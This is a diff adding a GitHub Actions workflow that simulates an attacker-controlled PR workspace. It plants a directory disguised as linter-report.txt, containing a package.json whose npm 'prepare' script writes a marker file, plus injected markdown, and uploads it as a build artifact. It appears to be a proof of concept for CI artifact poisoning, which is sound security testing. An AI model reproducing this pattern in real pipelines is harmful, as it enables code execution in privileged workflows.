@@ -1,0 +1,29 @@
+name: ADP Lint Up
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulate PR workspace containing an attacker-committed linter-report.txt directory
+        run: |
+          mkdir -p linter-report.txt
+          printf '%s\n' '{"name":"attacker-root","version":"1.0.0","scripts":{"prepare":"node -e \"require(\"fs\").writeFileSync(\"/tmp/ADP_PREPARE_RAN\",\"yes\")\""}}' > linter-report.txt/package.json
+          printf 'fund=false\n' > linter-report.txt/.npmrc
+          printf '```\nINJECTED MARKDOWN LINE\n' > linter-report.txt/linter-report.txt
+          ls -laR linter-report.txt
+      - name: Save PR number
+        env:
+          PR_NUMBER: "42"
+        run: echo "$PR_NUMBER" > pr-number.txt
+      - name: Upload linter report
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: |
+            linter-report.txt
+            pr-number.txt
+          if-no-files-found: ignore
